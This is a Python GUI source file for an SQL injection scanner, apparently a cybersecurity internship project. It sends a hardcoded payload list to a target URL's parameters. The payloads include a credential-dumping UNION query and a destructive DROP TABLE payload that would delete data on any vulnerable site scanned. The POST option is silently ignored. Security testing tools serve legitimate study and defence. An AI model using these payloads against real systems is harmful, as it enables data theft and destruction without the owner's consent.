import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import requests
from urllib.parse import urlencode, urlparse, parse_qs
import time
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

class FlexibleSQLScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("🔍 SQL Injection Scanner - Syntexhub Cybersecurity")
        self.root.geometry("1200x700")
        self.root.minsize(800, 500)  # Minimum window size
        
        # Make window resizable
        self.root.grid_rowconfigure(0, weight=1)
        self.root.grid_columnconfigure(0, weight=1)
        
        # Scanner variables
        self.scanning = False
        self.stop_scan = False
        self.vulnerabilities = []
        
        # Color schemes
        self.colors = {
            "bg": "#1e1e2e",
            "card_bg": "#2d2d3f",
            "accent": "#89b4fa",
            "success": "#a6e3a1",
            "danger": "#f38ba8",
            "warning": "#fab387",
            "text": "#cdd6f4",
            "text_secondary": "#9399b2",
            "input_bg": "#313244"
        }
        
        self.setup_ui()
        
    def setup_ui(self):
        """Create flexible responsive UI"""
        
        # Main container with grid
        main_frame = tk.Frame(self.root, bg=self.colors["bg"])
        main_frame.grid(row=0, column=0, sticky="nsew")
        self.root.grid_rowconfigure(0, weight=1)
        self.root.grid_columnconfigure(0, weight=1)
        
        # Configure grid weights for main_frame
        main_frame.grid_rowconfigure(0, weight=0)  # Header
        main_frame.grid_rowconfigure(1, weight=0)  # Input card
        main_frame.grid_rowconfigure(2, weight=0)  # Stats
        main_frame.grid_rowconfigure(3, weight=1)  # Output
        main_frame.grid_rowconfigure(4, weight=0)  # Status
        main_frame.grid_columnconfigure(0, weight=1)
        
        # Create sections
        self.create_header(main_frame)
        self.create_input_card(main_frame)
        self.create_stats_card(main_frame)
        self.create_output_section(main_frame)
        self.create_status_bar(main_frame)
        
        # Configure responsive behavior
        self.setup_responsive_layout()
        
    def create_header(self, parent):
        """Create responsive header"""
        header_frame = tk.Frame(parent, bg=self.colors["bg"], height=100)
        header_frame.grid(row=0, column=0, sticky="ew", pady=(10, 20))
        header_frame.grid_propagate(False)
        
        # Title - responsive font size
        title = tk.Label(header_frame, 
                        text="🔍 SQL Injection Vulnerability Scanner",
                        font=("Segoe UI", 24, "bold"),
                        fg=self.colors["accent"],
                        bg=self.colors["bg"])
        title.pack(expand=True)
        
        subtitle = tk.Label(header_frame,
                           text="Syntexhub Cybersecurity Internship Project",
                           font=("Segoe UI", 10),
                           fg=self.colors["text_secondary"],
                           bg=self.colors["bg"])
        subtitle.pack()
        
    def create_input_card(self, parent):
        """Create responsive input card"""
        card = tk.Frame(parent, bg=self.colors["card_bg"], relief=tk.RAISED, bd=1)
        card.grid(row=1, column=0, sticky="ew", padx=20, pady=(0, 15))
        
        # Configure grid for card
        card.grid_columnconfigure(1, weight=1)
        card.grid_columnconfigure(3, weight=1)
        
        # Title
        title = tk.Label(card, text="⚙️ Scan Configuration",
                        font=("Segoe UI", 12, "bold"),
                        fg=self.colors["text"],
                        bg=self.colors["card_bg"])
        title.grid(row=0, column=0, columnspan=6, sticky="w", padx=15, pady=(10, 15))
        
        # Row 1 - URL
        tk.Label(card, text="Target URL:", 
                font=("Segoe UI", 10),
                fg=self.colors["text_secondary"],
                bg=self.colors["card_bg"]).grid(row=1, column=0, sticky="e", padx=(15, 5), pady=8)
        
        self.url_entry = tk.Entry(card, font=("Segoe UI", 10),
                                  bg=self.colors["input_bg"],
                                  fg=self.colors["text"],
                                  insertbackground=self.colors["text"])
        self.url_entry.grid(row=1, column=1, columnspan=3, sticky="ew", padx=5, pady=8)
        self.url_entry.insert(0, "http://localhost:5000/?id=1")
        
        # Method
        tk.Label(card, text="Method:", 
                font=("Segoe UI", 10),
                fg=self.colors["text_secondary"],
                bg=self.colors["card_bg"]).grid(row=1, column=4, sticky="e", padx=(15, 5), pady=8)
        
        self.method_var = tk.StringVar(value="GET")
        method_combo = ttk.Combobox(card, textvariable=self.method_var, 
                                   values=["GET", "POST"], width=10,
                                   font=("Segoe UI", 10))
        method_combo.grid(row=1, column=5, sticky="w", padx=5, pady=8)
        
        # Row 2 - Threads
        tk.Label(card, text="Threads:", 
                font=("Segoe UI", 10),
                fg=self.colors["text_secondary"],
                bg=self.colors["card_bg"]).grid(row=2, column=0, sticky="e", padx=(15, 5), pady=8)
        
        self.threads_var = tk.StringVar(value="10")
        threads_spin = tk.Spinbox(card, from_=1, to=20, textvariable=self.threads_var,
                                 width=10, font=("Segoe UI", 10),
                                 bg=self.colors["input_bg"],
                                 fg=self.colors["text"])
        threads_spin.grid(row=2, column=1, sticky="w", padx=5, pady=8)
        
        # Delay
        tk.Label(card, text="Delay (sec):", 
                font=("Segoe UI", 10),
                fg=self.colors["text_secondary"],
                bg=self.colors["card_bg"]).grid(row=2, column=2, sticky="e", padx=(15, 5), pady=8)
        
        self.delay_var = tk.StringVar(value="0.3")
        delay_spin = tk.Spinbox(card, from_=0, to=2, increment=0.1, textvariable=self.delay_var,
                               width=10, font=("Segoe UI", 10),
                               bg=self.colors["input_bg"],
                               fg=self.colors["text"])
        delay_spin.grid(row=2, column=3, sticky="w", padx=5, pady=8)
        
        # Buttons
        button_frame = tk.Frame(card, bg=self.colors["card_bg"])
        button_frame.grid(row=3, column=0, columnspan=6, pady=(15, 15))
        
        self.scan_btn = tk.Button(button_frame, text="🚀 Start Scan", command=self.start_scan,
                                 font=("Segoe UI", 10, "bold"),
                                 bg="#00b894", fg="white",
                                 padx=20, pady=8, cursor="hand2")
        self.scan_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(button_frame, text="⏹️ Stop", command=self.stop_scan_func,
                                 font=("Segoe UI", 10, "bold"),
                                 bg="#d63031", fg="white",
                                 padx=20, pady=8, cursor="hand2", state='disabled')
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        clear_btn = tk.Button(button_frame, text="🗑️ Clear", command=self.clear_output,
                             font=("Segoe UI", 10, "bold"),
                             bg="#636e72", fg="white",
                             padx=20, pady=8, cursor="hand2")
        clear_btn.pack(side=tk.LEFT, padx=5)
        
        save_btn = tk.Button(button_frame, text="💾 Save Report", command=self.save_report,
                            font=("Segoe UI", 10, "bold"),
                            bg="#0984e3", fg="white",
                            padx=20, pady=8, cursor="hand2")
        save_btn.pack(side=tk.LEFT, padx=5)
        
        # Add hover effects
        self.add_hover_effect(self.scan_btn, "#00b894", "#00cec9")
        self.add_hover_effect(self.stop_btn, "#d63031", "#e17055")
        self.add_hover_effect(clear_btn, "#636e72", "#b2bec3")
        self.add_hover_effect(save_btn, "#0984e3", "#74b9ff")
        
    def add_hover_effect(self, button, color1, color2):
        """Add hover effect to button"""
        def on_enter(e):
            if button['state'] == 'normal':
                button.config(bg=color2)
        def on_leave(e):
            if button['state'] == 'normal':
                button.config(bg=color1)
        button.bind("<Enter>", on_enter)
        button.bind("<Leave>", on_leave)
        
    def create_stats_card(self, parent):
        """Create responsive statistics card"""
        card = tk.Frame(parent, bg=self.colors["card_bg"], relief=tk.RAISED, bd=1)
        card.grid(row=2, column=0, sticky="ew", padx=20, pady=(0, 15))
        
        # Configure grid for stats
        for i in range(4):
            card.grid_columnconfigure(i, weight=1)
        
        # Progress bar
        self.progress = ttk.Progressbar(card, mode='indeterminate', length=400)
        self.progress.grid(row=0, column=0, columnspan=4, pady=(15, 10), padx=20, sticky="ew")
        
        # Stats
        stats = [
            ("🎯", "Vulnerabilities", "0"),
            ("⏱️", "Scan Duration", "0s"),
            ("📦", "Payloads Tested", "0"),
            ("⚡", "Status", "Idle")
        ]
        
        self.stat_labels = []
        for i, (icon, title, value) in enumerate(stats):
            frame = tk.Frame(card, bg=self.colors["input_bg"])
            frame.grid(row=1, column=i, padx=10, pady=(0, 15), sticky="nsew")
            
            tk.Label(frame, text=icon, font=("Segoe UI", 20),
                    fg=self.colors["accent"],
                    bg=self.colors["input_bg"]).pack(pady=(10, 0))
            
            tk.Label(frame, text=title, font=("Segoe UI", 9),
                    fg=self.colors["text_secondary"],
                    bg=self.colors["input_bg"]).pack()
            
            label = tk.Label(frame, text=value, font=("Segoe UI", 16, "bold"),
                            fg=self.colors["accent"],
                            bg=self.colors["input_bg"])
            label.pack(pady=(0, 10))
            
            self.stat_labels.append(label)
        
        self.vuln_count_label = self.stat_labels[0]
        self.scan_time_label = self.stat_labels[1]
        self.payloads_label = self.stat_labels[2]
        self.status_stat_label = self.stat_labels[3]
        
    def create_output_section(self, parent):
        """Create responsive output section with notebook"""
        # Create notebook
        self.notebook = ttk.Notebook(parent)
        self.notebook.grid(row=3, column=0, sticky="nsew", padx=20, pady=(0, 10))
        
        # Console tab
        console_frame = tk.Frame(self.notebook)
        self.notebook.add(console_frame, text="📟 Console Output")
        
        self.output_text = scrolledtext.ScrolledText(console_frame, wrap=tk.WORD,
                                                      font=("Consolas", 10),
                                                      bg="#1e1e1e", fg="#d4d4d4",
                                                      insertbackground="white")
        self.output_text.pack(fill=tk.BOTH, expand=True)
        
        # Configure text tags
        self.output_text.tag_config('success', foreground='#00b894')
        self.output_text.tag_config('error', foreground='#d63031')
        self.output_text.tag_config('info', foreground='#fdcb6e')
        self.output_text.tag_config('vuln', foreground='#ff7675', font=('Consolas', 10, 'bold'))
        
        # Results tab
        results_frame = tk.Frame(self.notebook)
        self.notebook.add(results_frame, text="📊 Scan Results")
        
        # Create treeview with scrollbar
        tree_frame = tk.Frame(results_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True)
        
        # Scrollbars
        vsb = ttk.Scrollbar(tree_frame, orient="vertical")
        hsb = ttk.Scrollbar(tree_frame, orient="horizontal")
        
        self.tree = ttk.Treeview(tree_frame, columns=('Parameter', 'Payload', 'Type', 'Time'),
                                show='headings',
                                yscrollcommand=vsb.set,
                                xscrollcommand=hsb.set)
        
        vsb.config(command=self.tree.yview)
        hsb.config(command=self.tree.xview)
        
        # Define headings
        self.tree.heading('Parameter', text='Parameter')
        self.tree.heading('Payload', text='Payload')
        self.tree.heading('Type', text='Vulnerability Type')
        self.tree.heading('Time', text='Response Time')
        
        # Set column widths
        self.tree.column('Parameter', width=120, minwidth=80)
        self.tree.column('Payload', width=500, minwidth=200)
        self.tree.column('Type', width=150, minwidth=100)
        self.tree.column('Time', width=100, minwidth=80)
        
        # Layout
        self.tree.grid(row=0, column=0, sticky="nsew")
        vsb.grid(row=0, column=1, sticky="ns")
        hsb.grid(row=1, column=0, sticky="ew")
        
        tree_frame.grid_rowconfigure(0, weight=1)
        tree_frame.grid_columnconfigure(0, weight=1)
        
    def create_status_bar(self, parent):
        """Create responsive status bar"""
        status_frame = tk.Frame(parent, bg=self.colors["card_bg"], height=30)
        status_frame.grid(row=4, column=0, sticky="ew")
        status_frame.grid_propagate(False)
        
        self.status_label = tk.Label(status_frame, text="✅ Ready to scan",
                                    font=("Segoe UI", 9),
                                    fg=self.colors["text_secondary"],
                                    bg=self.colors["card_bg"])
        self.status_label.pack(side=tk.LEFT, padx=10, pady=5)
        
        # Copyright
        copyright_label = tk.Label(status_frame, text="© Syntexhub Cybersecurity Internship Project",
                                  font=("Segoe UI", 8),
                                  fg=self.colors["text_secondary"],
                                  bg=self.colors["card_bg"])
        copyright_label.pack(side=tk.RIGHT, padx=10, pady=5)
        
    def setup_responsive_layout(self):
        """Configure responsive layout behavior"""
        # Bind resize event
        self.root.bind('<Configure>', self.on_resize)
        
    def on_resize(self, event):
        """Handle window resize"""
        # Update treeview columns width proportionally
        if hasattr(self, 'tree'):
            width = self.tree.winfo_width()
            if width > 0:
                self.tree.column('Parameter', width=int(width * 0.15))
                self.tree.column('Payload', width=int(width * 0.55))
                self.tree.column('Type', width=int(width * 0.15))
                self.tree.column('Time', width=int(width * 0.15))
        
    def log(self, message, tag=None):
        """Add message to console"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted_msg = f"[{timestamp}] {message}"
        
        self.output_text.insert(tk.END, formatted_msg + "\n", tag)
        self.output_text.see(tk.END)
        self.root.update()
        
    def clear_output(self):
        """Clear all output"""
        self.output_text.delete(1.0, tk.END)
        for item in self.tree.get_children():
            self.tree.delete(item)
        self.vulnerabilities = []
        self.vuln_count_label.config(text="0")
        self.status_stat_label.config(text="Idle")
        self.log("Output cleared", 'info')
        
    def stop_scan_func(self):
        """Stop scanning"""
        self.stop_scan = True
        self.log("Scan stopped by user", 'warning')
        self.status_stat_label.config(text="Stopped")
        
    def save_report(self):
        """Save scan report"""
        if not self.vulnerabilities:
            messagebox.showwarning("No Results", "No scan results to save!")
            return
        
        file_path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("Text files", "*.txt"), ("All files", "*.*")]
        )
        
        if file_path:
            report_data = {
                'target': self.url_entry.get(),
                'timestamp': datetime.now().isoformat(),
                'total_vulnerabilities': len(self.vulnerabilities),
                'vulnerabilities': self.vulnerabilities,
                'scan_config': {
                    'method': self.method_var.get(),
                    'threads': int(self.threads_var.get()),
                    'delay': float(self.delay_var.get())
                }
            }
            
            with open(file_path, 'w') as f:
                json.dump(report_data, f, indent=2)
            
            self.log(f"Report saved to: {file_path}", 'success')
            messagebox.showinfo("Success", "Report saved successfully!")
            
    def get_payloads(self):
        """Get test payloads"""
        return {
            'Error Based': ["'", "\"", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "1' AND '1'='1", "1' AND '1'='2"],
            'Union Based': ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT username, password FROM users--", "1 UNION SELECT 1,2,3--"],
            'Boolean Based': ["1' AND '1'='1", "1' AND '1'='2", "1' AND SLEEP(5)--"],
            'Time Based': ["' OR SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"],
            'Destructive': ["'; DROP TABLE users; --"]
        }
        
    def is_vulnerable(self, response, payload, response_time):
        """Check if response indicates vulnerability"""
        response_text = response.text.lower()
        
        sql_errors = [
            "sql syntax", "mysql_fetch", "ora-", "postgresql",
            "sqlite", "odbc", "incorrect syntax", "unclosed quotation mark",
            "database error", "executed query"
        ]
        
        for error in sql_errors:
            if error in response_text:
                return True
        
        if "sleep" in payload.lower() and response_time >= 4.5:
            return True
            
        if "union" in payload.lower() and len(response_text) > 300:
            return True
            
        return False
        
    def test_payload(self, url, param_name, payload, payload_type, delay):
        """Test a single payload"""
        if self.stop_scan:
            return None
            
        time.sleep(delay)
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        test_url = parsed._replace(query=new_query).geturl()
        
        try:
            start_time = time.time()
            response = requests.get(test_url, timeout=10)
            response_time = time.time() - start_time
            
            if self.is_vulnerable(response, payload, response_time):
                return {
                    'parameter': param_name,
                    'payload': payload,
                    'type': payload_type,
                    'response_time': f"{response_time:.2f}s"
                }
        except:
            pass
        return None
        
    def start_scan(self):
        """Start the scan"""
        if self.scanning:
            return
            
        target_url = self.url_entry.get().strip()
        if not target_url:
            messagebox.showerror("Error", "Please enter a target URL!")
            return
            
        self.scanning = True
        self.stop_scan = False
        self.vulnerabilities = []
        self.clear_output()
        
        # Update UI
        self.scan_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        self.progress.start()
        self.status_label.config(text="🔍 Scanning in progress...")
        self.status_stat_label.config(text="Scanning")
        
        # Start scan thread
        thread = threading.Thread(target=self.run_scan, args=(target_url,))
        thread.daemon = True
        thread.start()
        
    def run_scan(self, target_url):
        """Execute the scan"""
        try:
            start_time = time.time()
            self.log("="*60, 'info')
            self.log("Starting SQL Injection Scan", 'success')
            self.log(f"Target: {target_url}", 'info')
            self.log(f"Method: {self.method_var.get()} | Threads: {self.threads_var.get()} | Delay: {self.delay_var.get()}s", 'info')
            
            parsed = urlparse(target_url)
            params = parse_qs(parsed.query)
            
            if not params and self.method_var.get() == 'GET':
                self.log("No URL parameters found!", 'error')
                self.finish_scan()
                return
                
            param_list = list(params.keys()) if params else ['data']
            payloads_dict = self.get_payloads()
            
            all_payloads = []
            for ptype, payloads in payloads_dict.items():
                for payload in payloads:
                    all_payloads.append((payload, ptype))
                    
            total_payloads = len(param_list) * len(all_payloads)
            self.payloads_label.config(text=str(total_payloads))
            
            self.log(f"Testing {len(param_list)} parameter(s) with {len(all_payloads)} payloads", 'info')
            
            found_count = 0
            with ThreadPoolExecutor(max_workers=int(self.threads_var.get())) as executor:
                futures = []
                for param in param_list:
                    for payload, ptype in all_payloads:
                        future = executor.submit(
                            self.test_payload, target_url, param, payload, ptype,
                            float(self.delay_var.get())
                        )
                        futures.append(future)
                        
                for future in as_completed(futures):
                    if self.stop_scan:
                        self.log("Scan interrupted by user", 'warning')
                        break
                        
                    result = future.result()
                    if result:
                        self.vulnerabilities.append(result)
                        found_count += 1
                        self.vuln_count_label.config(text=str(found_count))
                        self.log(f"VULNERABLE [{result['type']}] {result['parameter']} -> {result['payload'][:50]}", 'vuln')
                        self.root.after(0, self.add_to_tree, result)
                        
            scan_time = time.time() - start_time
            self.scan_time_label.config(text=f"{scan_time:.1f}s")
            
            self.log("="*60, 'info')
            if self.vulnerabilities:
                self.log(f"Scan complete - Found {len(self.vulnerabilities)} vulnerabilities in {scan_time:.1f}s", 'success')
            else:
                self.log("Scan complete - No vulnerabilities detected", 'success')
            self.log("="*60, 'info')
            
        except Exception as e:
            self.log(f"Error: {str(e)}", 'error')
        finally:
            self.finish_scan()
            
    def add_to_tree(self, result):
        """Add vulnerability to treeview"""
        self.tree.insert('', 0, values=(
            result['parameter'],
            result['payload'][:80],
            result['type'],
            result['response_time']
        ))
        
    def finish_scan(self):
        """Clean up after scan"""
        self.scanning = False
        self.progress.stop()
        self.scan_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.status_label.config(text="✅ Ready for next scan")
        
        if self.vulnerabilities:
            self.status_stat_label.config(text="Vulnerable")
        else:
            self.status_stat_label.config(text="Secure")

def main():
    root = tk.Tk()
    app = FlexibleSQLScannerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()